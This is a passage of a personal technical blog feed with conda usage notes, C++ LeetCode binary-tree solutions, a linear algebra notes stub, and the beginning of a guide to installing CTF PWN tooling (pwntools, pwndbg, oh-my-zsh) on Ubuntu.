<p>When miniconda3 is installed, tool <code>conda</code> is installed along with it.</p>
<pre><code class="language-bash"># Configurate miniconda3
# Edit .zshrc or .bashrc
export miniconda=/path/to/miniconda3
export PATH=$miniconda/bin:$miniconda/condabin:$PATH
# Save, quite. Then, source ~/.zshrc
</code></pre>
<pre><code class="language-bash"># Check the current python environment.
conda env list
# Create a virtual environment.
conda create -n se-hw python=3.6
# Activate a virtual environment.
conda activate se-hw
# Deactivate a virtual environment.
conda deactivate
</code></pre>
<pre><code class="language-bash"># Remove a virtual environment.
conda remove -n se-hw --all
# Remove a repo in the virtual environment.
conda remove -n se-hw $(package-name)
</code></pre>
<h1 id="to-be-continued-packaging-tools-in-python">To be Continued! Packaging Tools in Python</h1>
<h2 id="poetry">poetry</h2>
<p>A tool for Python dependency management and packaging.</p>
<p>GitHub Page: <a href="https://github.com/python-poetry/poetry">https://github.com/python-poetry/poetry</a></p>
<h2 id="pipenv">pipenv</h2>
<p><strong>Pipenv</strong> is a tool that aims to bring the best of all packaging worlds (bundler, composer, npm, cargo, yarn, etc.) to the Python world. <em>Windows is a first-class citizen, in this world.</em></p>
<p>Official Website: <a href="https://pipenv.pypa.io/en/latest/">https://pipenv.pypa.io/en/latest/</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[LeetCode Practice: Tree (Part 1)]]></title>
        <id>https://eclipse-yes.github.io/post/C-GHU6DNM/</id>
        <link href="https://eclipse-yes.github.io/post/C-GHU6DNM/">
        </link>
        <updated>2021-09-24T14:50:20.000Z</updated>
        <summary type="html"><![CDATA[<p align='center'>Intentional practicing is of great importance.</p>]]></summary>
        <content type="html"><![CDATA[<p align='center'>Intentional practicing is of great importance.</p>
<!-- more -->
<hr>
<h1 id="definition">Definition</h1>
<pre><code class="language-c++">struct TreeNode {
     int val;
     TreeNode *left;
     TreeNode *right;
     TreeNode() : val(0), left(nullptr), right(nullptr) {}
     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}
     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}
};
</code></pre>
<h1 id="404-sum-of-left-leaves">404. Sum of Left Leaves</h1>
<blockquote>
<p>Url: <a href="https://leetcode-cn.com/problems/sum-of-left-leaves/">https://leetcode-cn.com/problems/sum-of-left-leaves/</a><br>
Description: Given the <code>root</code> of a binary tree, return the sum of all left leaves.</p>
</blockquote>
<pre><code class="language-c++"># Author: eclipse
class Solution {
public:
    int sumOfLeftLeaves(TreeNode* root) {
        int sum = 0;
        if (!root) return 0;
        if (root-&gt;left &amp;&amp; !root-&gt;left-&gt;left &amp;&amp; !root-&gt;left-&gt;right) sum = root-&gt;left-&gt;val;
        return sum + sumOfLeftLeaves(root-&gt;left) + sumOfLeftLeaves(root-&gt;right);
    }
};
</code></pre>
<h1 id="655-print-binary-tree">655. Print Binary Tree</h1>
<blockquote>
<p>Url: <a href="https://leetcode-cn.com/problems/print-binary-tree/">https://leetcode-cn.com/problems/print-binary-tree/</a><br>
Description: Given the root of a binary tree, construct a 0-indexed m x n string matrix res that represents a formatted layout of the tree, a matrix layout. The matrix's row number is <code>height+1</code>, while its column number is <code>2^height-1</code>.</p>
</blockquote>
<pre><code class="language-c++"># Author: eclipse
class Solution {
public:
    vector&lt;vector&lt;string&gt;&gt; printTree(TreeNode* root) {
        int h = getHeight(root);
        int w = (1 &lt;&lt; h) - 1;
        vector&lt;vector&lt;string&gt;&gt; res(h, vector&lt;string&gt;(w, &quot;&quot;));
        fillVec(root, res, 0, 0, w-1);
        return res;
    }
private:
    int getHeight(TreeNode* root) {
        if (!root) return 0;
        return max(getHeight(root-&gt;left), getHeight(root-&gt;right)) + 1;
    }
    void fillVec(TreeNode *root, vector&lt;vector&lt;string&gt;&gt; &amp;res, int h, int l, int r) {
        if (!root) return;
        int mid = (l + r) / 2;
        res[h][mid] = std::to_string(root-&gt;val);
        fillVec(root-&gt;left, res, h+1, l, mid-1);
        fillVec(root-&gt;right, res, h+1, mid+1, r);
    }
};
</code></pre>
<h1 id="637-average-of-levels-in-binary-tree">637. Average of Levels in Binary Tree</h1>
<blockquote>
<p>Url: <a href="https://leetcode-cn.com/problems/average-of-levels-in-binary-tree/">https://leetcode-cn.com/problems/average-of-levels-in-binary-tree/</a><br>
Description: Given the root of a binary tree, return the average value of the nodes on each level in the form of an array.</p>
</blockquote>
<p>Solv1: DFS</p>
<pre><code class="language-c++">class Solution {
public:
    vector&lt;double&gt; averageOfLevels(TreeNode* root) {
        if (root == nullptr) return {};
	      vector&lt;double&gt; ans;
        vector&lt;pair&lt;long long, int&gt;&gt; sum_count;
      
        // Count each level's sum of values.
        preOrder(root, 0, sum_count);       
        // When sum_count is all set.
        for (const auto&amp; p : sum_count)
            ans.push_back(static_cast&lt;double&gt;(p.first) / p.second);
        return ans;
    }
private:
    void preOrder(TreeNode* root, int depth, vector&lt;pair&lt;long long, int&gt;&gt;&amp; sum_count) {
        if (root == nullptr) return;
        if (depth &gt;= sum_count.size()) sum_count.push_back({0,0});
        sum_count[depth].first += root-&gt;val;
        sum_count[depth].second++;
        preOrder(root-&gt;left, depth+1, sum_count);
        preOrder(root-&gt;right, depth+1, sum_count);
    }
};
</code></pre>
<p>Solv2: BFS</p>
<pre><code class="language-c++">class Solution {
public:
    vector&lt;double&gt; averageOfLevels(TreeNode* root) {
        if (root == nullptr) return {};
        vector&lt;double&gt; ans;
        vector&lt;TreeNode*&gt; curr, next;
        curr.push_back(root);
        
        // Process every level's nodes one by one.
        while (!curr.empty()) {
            long long sum = 0;
            for (const auto&amp; node : curr) {
                sum += node-&gt;val;
                if (node-&gt;left) next.push_back(node-&gt;left);
                if (node-&gt;right) next.push_back(node-&gt;right);
            }
            ans.push_back(static_cast&lt;double&gt;(sum) / curr.size());
            next.swap(curr);
            next.clear();
        }       
        return ans;
    }
};
</code></pre>
<h1 id="617-merge-two-binary-trees">617. Merge Two Binary Trees</h1>
<blockquote>
<p>Url: <a href="https://leetcode-cn.com/problems/merge-two-binary-trees/">https://leetcode-cn.com/problems/merge-two-binary-trees/</a><br>
Description: Given two binary trees <code>root1 root2</code>. Merge them together with requirements like: if overlapping, sum two nodes; Otherwise, the not null node will be used as the node of the new tree.</p>
</blockquote>
<p>Solv1: modifying the original trees is not allowed</p>
<pre><code class="language-c++">class Solution {
public:
    TreeNode* mergeTrees(TreeNode* root1, TreeNode* root2) {
        if (root1 == nullptr) return root2;
        if (root2 == nullptr) return root1;
        
        auto root = new TreeNode(root1-&gt;val + root2-&gt;val);
        root-&gt;left = mergeTrees(root1-&gt;left, root2-&gt;left);
        root-&gt;right = mergeTrees(root1-&gt;right, root2-&gt;right);
      
        return root;
    }
};
</code></pre>
<p>Solv2: modifying the original trees is allowed</p>
<pre><code class="language-c++">class Solution {
public:
    TreeNode* mergeTrees(TreeNode* root1, TreeNode* root2) {
        if (root1 == nullptr) return root2;
        if (root2 == nullptr) return root1;

        auto root = root1;
        root-&gt;val += root2-&gt;val;
        root-&gt;left = mergeTrees(root1-&gt;left, root2-&gt;left);
        root-&gt;right = mergeTrees(root1-&gt;right, root2-&gt;right);
      
        return root;
    }
};
</code></pre>
<h1 id="606-construct-string-from-binary-tree">606. Construct String from Binary Tree</h1>
<blockquote>
<p>Url: <a href="https://leetcode-cn.com/problems/construct-string-from-binary-tree/">https://leetcode-cn.com/problems/construct-string-from-binary-tree/</a><br>
Description: Given the root of a binary tree, construct a string consists of parenthesis and integers from a binary tree with the preorder traversing way, and return it. Omit all the empty parenthesis pairs that do not affect the one-to-one mapping relationship between the string and the original binary tree.</p>
</blockquote>
<pre><code class="language-c++">class Solution {
public:
    string tree2str(TreeNode* root) {
        if (root == nullptr) return &quot;&quot;;
        const string s = std::to_string(root-&gt;val);
        const string l = tree2str(root-&gt;left);
        const string r = tree2str(root-&gt;right);
        // Special case 0: s()() -&gt; s
        if (root-&gt;left == nullptr &amp;&amp; root-&gt;right == nullptr) return s;
        // Special case 1: s(l)() -&gt; s(l)
        if (root-&gt;right == nullptr) return s + &quot;(&quot; + l + &quot;)&quot;;
        // General case: s(l)(r)
        return s + &quot;(&quot; + l + &quot;)&quot; + &quot;(&quot; + r + &quot;)&quot;;
    }
};
</code></pre>
<h1 id="112-path-sum">112. Path Sum</h1>
<blockquote>
<p>Url: <a href="https://leetcode-cn.com/problems/path-sum/">https://leetcode-cn.com/problems/path-sum/</a><br>
Description: Given the root of a binary tree and an integer targetSum, return true if the tree has a root-to-leaf path such that adding up all the values along the path equals targetSum.</p>
</blockquote>
<pre><code class="language-c++">class Solution {
public:
    bool hasPathSum(TreeNode* root, int targetSum) {
        if (root == nullptr) return false;
        if (root-&gt;left == nullptr &amp;&amp; root-&gt;right == nullptr)
            return root-&gt;val == targetSum;
        int new_targetSum = targetSum - root-&gt;val;
        return hasPathSum(root-&gt;left, new_targetSum) || hasPathSum(root-&gt;right, new_targetSum);
    }
};
</code></pre>
<h1 id="113-path-sum-ii">113. Path Sum II</h1>
<blockquote>
<p>Url: <a href="https://leetcode-cn.com/problems/path-sum-ii/">https://leetcode-cn.com/problems/path-sum-ii/</a><br>
Description: Given the root of a binary tree and an integer targetSum, return all root-to-leaf paths where the sum of the node values in the path equals targetSum. Each path should be returned as a list of the node values, not node references. A root-to-leaf path is a path starting from the root and ending at any leaf node.</p>
</blockquote>
<pre><code class="language-c++">class Solution {
public:
    vector&lt;vector&lt;int&gt;&gt; pathSum(TreeNode* root, int targetSum) {
        vector&lt;vector&lt;int&gt;&gt; ans;
        vector&lt;int&gt; curr;
        pathSum(root, targetSum, curr, ans);
        return ans;
    }
private:
    void pathSum(TreeNode* root, int targetSum, vector&lt;int&gt;&amp; curr, vector&lt;vector&lt;int&gt;&gt;&amp; ans) {
        if (root == nullptr) return;
        if (root-&gt;left == nullptr &amp;&amp; root-&gt;right == nullptr) {
            if (root-&gt;val == targetSum) {
                ans.push_back(curr);
                ans.back().push_back(root-&gt;val);
            }
            return;
        }
        
        curr.push_back(root-&gt;val);
        int newTargetSum = targetSum - root-&gt;val;
        pathSum(root-&gt;left, newTargetSum, curr, ans);
        pathSum(root-&gt;right, newTargetSum, curr, ans);
        curr.pop_back();
    }
};
</code></pre>
<h1 id="100-same-tree">100. Same Tree</h1>
<blockquote>
<p>Url: <a href="https://leetcode-cn.com/problems/same-tree/">https://leetcode-cn.com/problems/same-tree/</a><br>
Description: Given the roots of two binary trees p and q, write a function to check if they are the same or not. Both structurally and node's value-side identical.</p>
</blockquote>
<pre><code class="language-c++">class Solution {
public:
    bool isSameTree(TreeNode* p, TreeNode* q) {
        // Case 0: p and q are all empty.
        if (p == nullptr &amp;&amp; q == nullptr) return true;
        // Case 1: p and q are not all empty.
        if (p == nullptr || q == nullptr) return false;
        // Case 2: p and q are not empty but values are not the same.
        if (p-&gt;val != q-&gt;val) return false;
        // Recursively compare left-subtree and right-subtree.
        return isSameTree(p-&gt;left, q-&gt;left) &amp;&amp; isSameTree(p-&gt;right, q-&gt;right);
    }
};
</code></pre>
<h1 id="110-balanced-binary-tree">110. Balanced Binary Tree</h1>
<blockquote>
<p>Url: <a href="https://leetcode-cn.com/problems/balanced-binary-tree/">https://leetcode-cn.com/problems/balanced-binary-tree/</a><br>
Description: Given a binary tree, determine if it is height-balanced.</p>
</blockquote>
<p>The definition of <code>Height-Balanced</code>:<br>
A binary tree in which the left and right subtrees of every node differ in height by no more than 1.</p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210925130606.png" alt="image-20210925130606965" loading="lazy"></figure>
<p>Solv1: recursively check isBalanced and calculate height. O(nlogn)</p>
<pre><code class="language-c++">class Solution {
public:
    bool isBalanced(TreeNode* root) {
        if (root == nullptr) return true;
        int leftHeight = getHeight(root-&gt;left);
        int rightHeight = getHeight(root-&gt;right);
        return (abs(leftHeight - rightHeight)&lt;=1) &amp;&amp; isBalanced(root-&gt;left) &amp;&amp; isBalanced(root-&gt;right);
    }
private:
    int getHeight(TreeNode* root) {
        if (root == nullptr) return 0;
        return max(getHeight(root-&gt;left), getHeight(root-&gt;right)) + 1;
    }
};
</code></pre>
<p>Solv2: recursively calculate height as well as checking isBalanced. O(n)</p>
<pre><code class="language-c++">class Solution {
public:
    bool isBalanced(TreeNode* root) {
        if (root == nullptr) return true;
        bool balanced = true;
        check(root, balanced);
        return balanced;
    }
private:
    int check(TreeNode* root, bool&amp; balanced) {
        if (root == nullptr) return 0;
        int leftHeight = check(root-&gt;left, balanced);
        int rightHeight = check(root-&gt;right, balanced);
        if (abs(leftHeight - rightHeight) &gt; 1) {
            balanced = false;
            return -1;
        }
        return max(leftHeight, rightHeight) + 1;
    }
};
</code></pre>
<h1 id="102-binary-tree-level-order-traversal">102. Binary Tree Level Order Traversal</h1>
<blockquote>
<p>URL: <a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/">https://leetcode-cn.com/problems/binary-tree-level-order-traversal/</a><br>
Description: Given the root of a binary tree, return the level order traversal of its nodes' values.</p>
</blockquote>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210926223624.png" alt="image-20210926223624188" loading="lazy"></figure>
<pre><code class="language-c++">class Solution {
public:
    vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) {
        return BFS(root);
    }
private:
    vector&lt;vector&lt;int&gt;&gt; BFS(TreeNode* root) {
        if (root == nullptr) return {};
        vector&lt;vector&lt;int&gt;&gt; ans;
        vector&lt;TreeNode*&gt; curr, next;
        curr.push_back(root);
        while (!curr.empty()) {
            ans.push_back({});
            for (const auto node : curr) {
                ans.back().push_back(node-&gt;val);
                if (node-&gt;left) next.push_back(node-&gt;left);
                if (node-&gt;right) next.push_back(node-&gt;right);
            }
            next.swap(curr);
            next.clear();
        }
        return ans;
    }
};
</code></pre>
<pre><code class="language-c++">class Solution {
public:
    vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) {
        vector&lt;vector&lt;int&gt;&gt; ans;
        DFS(root, 0, ans);
        return ans;
    }
private:
    void DFS(TreeNode* root, int depth, vector&lt;vector&lt;int&gt;&gt;&amp; ans) {
        if (root == nullptr) return;
      	// Suitable for pre/in/post order traversal.
        while (ans.size() &lt;= depth) ans.push_back({});
        DFS(root-&gt;left, depth+1, ans);
        DFS(root-&gt;right, depth+1, ans);
        ans.at(depth).push_back(root-&gt;val);
    }
};
</code></pre>
<h1 id="671-second-minimum-node-in-a-binary-tree">671. Second Minimum Node In a Binary Tree</h1>
<blockquote>
<p>URL: <a href="https://leetcode-cn.com/problems/second-minimum-node-in-a-binary-tree/">https://leetcode-cn.com/problems/second-minimum-node-in-a-binary-tree/</a></p>
<p>Description: Given such a special binary tree, output the second minimum value in the set made of all the nodes' value in the whole tree. If no such second minimum value exists, output -1 instead.</p>
<p><strong>Constraints:</strong></p>
<pre><code>  1. non-empty special binary tree consisting of nodes with the non-negative value;
  	2. each node has 2 or 0 sub-node
  	3. root.val = min(root.left.val, root.right.val)
  	4. The number of nodes in the tree is in the range [1, 25]
  	5. 1 &lt;= Node.val &lt;= 231 - 1
</code></pre>
</blockquote>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210926232447.png" alt="image-20210926232447747" loading="lazy"></figure>
<p>For the solution of BFS, the first time I use <code>int s2 =INT_MAX</code> to set s2, but one cause failed as submitting. The reason is that the biggest value available for node <code>2^31-1</code>. The suitable initial value of s2 is <strong>INT32_MAX</strong>. Therefore, change to <code>long long s2 = INT32_MAX</code> and everything is all right.</p>
<pre><code class="language-c++">class Solution {
public:
    int findSecondMinimumValue(TreeNode* root) {
        if (root == nullptr) return -1;
        return BFS(root);
    }
private:
    int BFS(TreeNode* root) {
        if (root == nullptr) return -1;
        // Smallest value;
        int s1 = root-&gt;val;
        // Second small value;
        long long s2 = INT32_MAX;
        bool found = false;
        deque&lt;TreeNode*&gt; q;
        q.push_back(root);
        
        while (!q.empty()) {
            TreeNode* node = q.front();
            q.pop_front();
            // Keep update the second small value.
            if (node-&gt;val &gt; s1 &amp;&amp; node-&gt;val &lt;= s2) {
                // If found a second small value under this queue,
                // no need to add this node's children.
                s2 = node-&gt;val;
                found = true;
                continue;
            }
            
            // If the second small value does not appear,
            // keep adding this node's children into queue.
            if (node-&gt;left == nullptr) continue;
            q.push_back(node-&gt;left);
            q.push_back(node-&gt;right);
        }
        
        return found ? s2 : -1;
    }
};
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210926232626.png" alt="image-20210926232626158" loading="lazy"></figure>
<pre><code class="language-c++">class Solution {
public:
    int findSecondMinimumValue(TreeNode* root) {
        if (root == nullptr) return -1;
        return DFS(root, root-&gt;val);
    }
private:
    // s1 is the current smallest value.
    int DFS(TreeNode* root, int s1) {
        if (root == nullptr) return -1;
        
        // If root's value is already greater than s1,
        // thus root's value is the second smallest one.
        if (root-&gt;val &gt; s1) return root-&gt;val;
        // Otherwise, recursively seek root's children
        // and check the smaller one.
        int sl = DFS(root-&gt;left, s1);
        int sr = DFS(root-&gt;right, s1);
        if (sl == -1) return sr;
        if (sr == -1) return sl;
        return min(sl, sr);
    }
};
</code></pre>
<h1 id="669-trim-a-binary-search-tree">669. Trim a Binary Search Tree</h1>
<blockquote>
<p>URL: <a href="https://leetcode-cn.com/problems/trim-a-binary-search-tree/">https://leetcode-cn.com/problems/trim-a-binary-search-tree/</a><br>
Description: Given the root of a binary search tree and the lowest and highest boundaries as low and high, trim the tree so that all its elements lies in [low, high]. Trimming the tree should not change the relative structure of the elements that will remain in the tree (i.e., any node's descendant should remain a descendant). It can be proven that there is a unique answer. Return the root of the trimmed binary search tree. Note that the root may change depending on the given bounds.</p>
</blockquote>
<figure data-type="image" tabindex="5"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210927231550.png" alt="image-20210927231550953" loading="lazy"></figure>
<pre><code class="language-c++">class Solution {
public:
    // No cleanup means memory leak.
    TreeNode* trimBST(TreeNode* root, int low, int high) {
        if (root == nullptr) return nullptr;
        // If val not in range, return the left/right subtrees.
        if (root-&gt;val &lt; low) return trimBST(root-&gt;right, low, high);
        if (root-&gt;val &gt; high) return trimBST(root-&gt;left, low , high);
        // If val in [low, high], recursively trim left/right subtrees.
        root-&gt;left = trimBST(root-&gt;left, low, high);
        root-&gt;right = trimBST(root-&gt;right, low, high);
        return root;
    }
};
</code></pre>
<h1 id="654-maximum-binary-tree">654. Maximum Binary Tree</h1>
<blockquote>
<p>URL: <a href="https://leetcode-cn.com/problems/maximum-binary-tree/">https://leetcode-cn.com/problems/maximum-binary-tree/</a><br>
Description: You are given an integer array nums with no duplicates. Return a maximum binary tree built recursively from nums.</p>
<p>Algorithm:</p>
<ol>
<li>Create a root node whose value is the maximum value in nums.</li>
<li>Recursively build the left subtree on the subarray prefix to the left of the maximum value.</li>
<li>Recursively build the right subtree on the subarray suffix to the right of the maximum value.</li>
</ol>
</blockquote>
<figure data-type="image" tabindex="6"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210927225119.png" alt="image-20210927225119636" loading="lazy"></figure>
<pre><code class="language-c++">class Solution {
public:
    TreeNode* constructMaximumBinaryTree(vector&lt;int&gt;&amp; nums) {
        if (nums.empty()) return nullptr;
        // Find the max element in nums -&gt; O(n)
        auto it = std::max_element(nums.begin(), nums.end());
        TreeNode* root = new TreeNode(*it);
        vector&lt;int&gt; left(nums.begin(), it);
        vector&lt;int&gt; right(it+1, nums.end());
        root-&gt;left = constructMaximumBinaryTree(left);
        root-&gt;right = constructMaximumBinaryTree(right);
        return root;
    }
};
</code></pre>
<p>The solution above copyies two vectors in each recursion. One way to improve is to use reference instead of copying.</p>
<pre><code class="language-c++">class Solution {
public:
    TreeNode* constructMaximumBinaryTree(vector&lt;int&gt;&amp; nums) {
        return makeMBT(nums, 0, nums.size());
    }
private:
    TreeNode* makeMBT(const vector&lt;int&gt;&amp; nums, int begin, int end) {
        if (begin &gt;= end) return nullptr;
        auto it = std::max_element(nums.begin()+begin, nums.begin()+end);
        TreeNode* root = new TreeNode(*it);
        int index = it - nums.begin();
        root-&gt;left = makeMBT(nums, begin, index);
        root-&gt;right = makeMBT(nums, index+1, end);
        return root;
    }
};
</code></pre>
<h1 id="145-binary-tree-postorder-traversal">145. Binary Tree Postorder Traversal</h1>
<blockquote>
<p>URL: <a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/">https://leetcode-cn.com/problems/binary-tree-postorder-traversal/</a><br>
Description: Given the root of a binary tree, return the postorder traversal of its nodes' values.</p>
</blockquote>
<p>(1) Recursive Solution:</p>
<figure data-type="image" tabindex="7"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210928103307.png" alt="img" loading="lazy"></figure>
<pre><code class="language-c++">class Solution {
public:
    vector&lt;int&gt; postorderTraversal(TreeNode* root) {
        vector&lt;int&gt; ans;
        postorderTraversal(root, ans);
        return ans;
    }
private:
    void postorderTraversal(TreeNode* root, vector&lt;int&gt;&amp; ans) {
        if (root == nullptr) return;
        postorderTraversal(root-&gt;left, ans);
        postorderTraversal(root-&gt;right, ans);
        ans.push_back(root-&gt;val);
    }
};
</code></pre>
<p>(2) Iterative Solution:</p>
<figure data-type="image" tabindex="8"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210928103338.png" alt="img" loading="lazy"></figure>
<pre><code class="language-c++">class Solution {
public:
    vector&lt;int&gt; postorderTraversal(TreeNode* root) {
        if (root == nullptr) return {};
        deque&lt;int&gt; ans;
        stack&lt;TreeNode*&gt; s;
        s.push(root);
        while (!s.empty()) {
            TreeNode* n = s.top();
            s.pop();
            // reverse(print(root), traverse(root-&gt;right), traverse(root-&gt;left))
            ans.push_front(n-&gt;val);
            if (n-&gt;left != nullptr) s.push(n-&gt;left);
            if (n-&gt;right != nullptr) s.push(n-&gt;right);
        }
        return vector&lt;int&gt;(ans.begin(), ans.end());
    }
};
</code></pre>
<h1 id="295-find-median-from-data-stream">295. Find Median from Data Stream</h1>
<blockquote>
<p>URL: https://leetcode-cn.com/problems/find-median-from-data-stream/<br>
Description: Comprehension of median. Then, implement the MedianFinder class.</p>
<p>Requirements:</p>
<ul>
<li>MedianFinder() initializes the MedianFinder object.</li>
<li>void addNum(int num) adds the integer num from the data stream to the data structure.</li>
<li>double findMedian() returns the median of all elements so far.</li>
</ul>
<p>Constraints:</p>
<ul>
<li>-10^5 &lt;= num &lt;= 10^5</li>
<li>There will be at least one element in the data structure before calling findMedian.</li>
<li>At most 5 * 10^4 calls will be made to addNum and findMedian.</li>
</ul>
</blockquote>
<p>The first solution: brute force (not accepted)</p>
<figure data-type="image" tabindex="9"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211004003720.png" alt="img" loading="lazy"></figure>
<p>The second solution: <strong><u><em>two heap</em></u></strong> (little tricky)</p>
<figure data-type="image" tabindex="10"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211004003908.png" alt="img" loading="lazy"></figure>
<pre><code class="language-c++">class MedianFinder {
public:
    MedianFinder() {}

    // Constraints:
    // 1. l_.size() &gt;= r_.size()
    // 2. l_.size() - r_.size() &lt;= 1
    void addNum(int num) {
        // Step 1: Add a num into max-heap or min-heap.
        if (l_.empty() || num &lt;= l_.top()) {
            l_.push(num);
        } else {
            r_.push(num);
        }

        // Step 2: Balance max-heap and min-heap.
        if (l_.size() &lt; r_.size()) {
            l_.push(r_.top());
            r_.pop();
        } else if (l_.size() - r_.size() == 2) {
            r_.push(l_.top());
            l_.pop();
        }
    }

    double findMedian() {
        if (l_.size() &gt; r_.size()) {
            return static_cast&lt;double&gt;(l_.top());
        } else {
            return (static_cast&lt;double&gt;(l_.top())+static_cast&lt;double&gt;(r_.top())) / 2;
        }
    }
private:
    priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt; l_; // max-heap
    priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; r_; // min-heap
};
</code></pre>
<p>The third solution: <strong><u><em>balanced binary tree</em></u></strong></p>
<figure data-type="image" tabindex="11"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20211004003929.png" alt="img" loading="lazy"></figure>
<pre><code class="language-c++">class MedianFinder {
public:
    MedianFinder() {}

    void addNum(int num) {
        if (m_.empty()) {
            l_ = r_ = m_.insert(num);
            return;
        }
        
        m_.insert(num);
        const size_t n = m_.size();
        
        if (n &amp; 1) {
            if (num &gt;= *r_) {
                l_ = r_;
            } else {
                l_ = --r_;
            }
        } else {
            if (num &gt;= *r_)
                ++r_;
            else
                --l_;
        }
    }

    double findMedian() {
        return (static_cast&lt;double&gt;(*l_) + *r_) / 2;
    }
private:
    multiset&lt;int&gt; m_;
    multiset&lt;int&gt;::const_iterator l_;
    multiset&lt;int&gt;::const_iterator r_;
};
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Lecture Notes: Linear Algebra]]></title>
        <id>https://eclipse-yes.github.io/post/1Fyux24SY/</id>
        <link href="https://eclipse-yes.github.io/post/1Fyux24SY/">
        </link>
        <updated>2021-09-23T05:38:54.000Z</updated>
        <summary type="html"><![CDATA[<p align='center'>大学课程：线性代数；笔记+课堂总结+题目总结。</p>]]></summary>
        <content type="html"><![CDATA[<p align='center'>大学课程：线性代数；笔记+课堂总结+题目总结。</p>
<!-- more -->
<h1 id="chapter1-determinants">Chapter1 Determinants</h1>
<figure data-type="image" tabindex="1"><img src="https://eclipse-yes.github.io/post-images/1633589984119.png" alt="chapter1-mindmap" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Now, Parallels Tools can be Smoothly Installed on Kali 2021.02]]></title>
        <id>https://eclipse-yes.github.io/post/2tUZw0V4U/</id>
        <link href="https://eclipse-yes.github.io/post/2tUZw0V4U/">
        </link>
        <updated>2021-09-17T02:25:17.000Z</updated>
        <content type="html"><![CDATA[<p>Happy news.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Ubuntu-Based Environment for PWN]]></title>
        <id>https://eclipse-yes.github.io/post/SzH2SEYJz/</id>
        <link href="https://eclipse-yes.github.io/post/SzH2SEYJz/">
        </link>
        <updated>2021-09-15T01:07:09.000Z</updated>
        <summary type="html"><![CDATA[<p>There are several choices for implementing ctf environment for PWN. For example, docker containers or virtual machines including Ubuntu 16 18 20, Kali Linux and so on.</p>
]]></summary>
        <content type="html"><![CDATA[<p>There are several choices for implementing ctf environment for PWN. For example, docker containers or virtual machines including Ubuntu 16 18 20, Kali Linux and so on.</p>
<!-- more -->
<h1 id="setting-up">Setting Up</h1>
<ol>
<li>Apt: Tsinghua Mirror</li>
<li>Script Language: Python3 with pip</li>
<li>Editor: Neovim with SpaceVim, Sublime</li>
<li>Dependent Library: 32bit 64bit</li>
<li>Shell: zsh with oh-my-zsh</li>
<li>Toolset: pwntools</li>
<li>GDB: pwndbg peda gef</li>
<li>Gadget: ROPgadget Onegadget</li>
<li>LibcSearcher</li>
<li>Hardware Virtualization: qemu</li>
<li>Multiple Architecture Debugger: gdb-multiarch</li>
</ol>
<h1 id="1-set-up-apt-sources-mirroring">1. Set up Apt Sources Mirroring</h1>
<p>Tsinghua Mirror: <a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/</a></p>
<p>Alibaba Mirror: <a href="https://developer.aliyun.com/mirror/ubuntu/">https://developer.aliyun.com/mirror/ubuntu/</a></p>
<pre><code class="language-bash">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak
sudo vim /etc/apt/sources.list
</code></pre>
<h1 id="3-neovim-with-spacevim-and-sublime">3. Neovim with Spacevim and Sublime</h1>
<pre><code class="language-bash">sudo apt install neovim -y
</code></pre>
<pre><code class="language-bash">wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
sudo apt-get install apt-transport-https
echo &quot;deb https://download.sublimetext.com/ apt/stable/&quot; | sudo tee /etc/apt/sources.list.d/sublime-text.list
sudo apt-get update
sudo apt-get install sublime-text
</code></pre>
<h1 id="4-dependent-library-32bit">4. Dependent Library: 32bit</h1>
<pre><code class="language-bash"># 32 bit dependent library
sudo apt install lib32ncurses6, lib32z1
</code></pre>
<h1 id="5-zsh-with-oh-my-zsh">5. ZSH with Oh-My-Zsh</h1>
<pre><code class="language-bash">sudo apt install git zsh -y
</code></pre>
<pre><code class="language-bash">sh -c &quot;$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;
sh -c &quot;$(wget https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh -O -)&quot;
</code></pre>
<p>Recommended Plugins for oh-my-zsh:</p>
<ul>
<li><a href="https://github.com/zsh-users/zsh-autosuggestions">zsh-autosuggestions</a></li>
<li><a href="https://github.com/zsh-users/zsh-syntax-highlighting">zsh-syntax-highlighting</a></li>
</ul>
<h1 id="6-pwntools">6. Pwntools</h1>
<pre><code class="language-bash">sudo apt install python3 python3-pip python3-dev
sudo pip install --upgrade pip
sudo pip install --upgrade pwntools
</code></pre>
<h1 id="7-pwndbg-peda-gef">7. Pwndbg Peda Gef</h1>
<h2 id="71-pwndbg">7.1 pwndbg</h2>
<p>Github Repo Address: <a href="https://github.com/pwndbg/pwndbg/">https://github.com/pwndbg/pwndbg/</a></p>
<pre><code class="language-bash">git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
</code></pre>
<h2 id="72-peda">7.2 Peda</h2>
<p>Github Repo Address: <a href="https://github.com/longld/peda/">https://github.com/longld/peda/</a></p>
